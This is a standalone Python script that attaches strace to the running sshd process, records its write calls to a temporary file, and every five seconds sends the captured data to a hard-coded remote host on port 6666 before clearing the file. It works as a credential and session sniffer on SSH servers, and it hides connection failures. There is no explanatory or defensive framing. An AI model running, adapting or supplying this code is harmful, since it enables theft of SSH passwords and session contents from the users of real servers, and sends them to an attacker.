import subprocess
import os
import time
import socket
import threading

def find_sshd_pid():
    result = subprocess.run(['pgrep', 'sshd'], stdout=subprocess.PIPE, text=True)
    return result.stdout.strip()

def start_strace(sshd_pid, output_file):
    strace_command = ["strace", "-f", "-p", sshd_pid, "-e", "trace=write", "-o", output_file]
    subprocess.Popen(strace_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def send_data_to_remote(data, remote_host, remote_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((remote_host, remote_port))
            s.sendall(data.encode())
            print(f"Sent content of {output_file} over to {remote_host} on port {remote_port}")
        except ConnectionRefusedError:
            pass  # Handle the connection refused error (silently)
        except Exception as e:
            print(f"Error sending data: {e}")

def periodically_send_data(output_file, remote_host, remote_port, interval=5):
    while True:
        time.sleep(interval)
        with open(output_file, 'r') as file:
            file_data = file.read()
            send_data_to_remote(file_data, remote_host, remote_port)

        # Open the file in write mode to overwrite the content
        with open(output_file, 'w'):
            pass

def main():
    output_file = "/tmp/output.txt"
    remote_host = "192.168.1.77"
    remote_port = 6666

    sshd_pid = find_sshd_pid()

    if not os.path.exists(output_file):
        with open(output_file, "w"):
            pass

    if sshd_pid:
        start_strace(sshd_pid, output_file)
    else:
        print("Error: Unable to find the PID of sshd.")
        return

    # Start a separate thread for periodically sending data
    send_thread = threading.Thread(target=periodically_send_data, args=(output_file, remote_host, remote_port))
    send_thread.daemon = True
    send_thread.start()

    try:
        while True:
            # Your main program logic can go here
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()
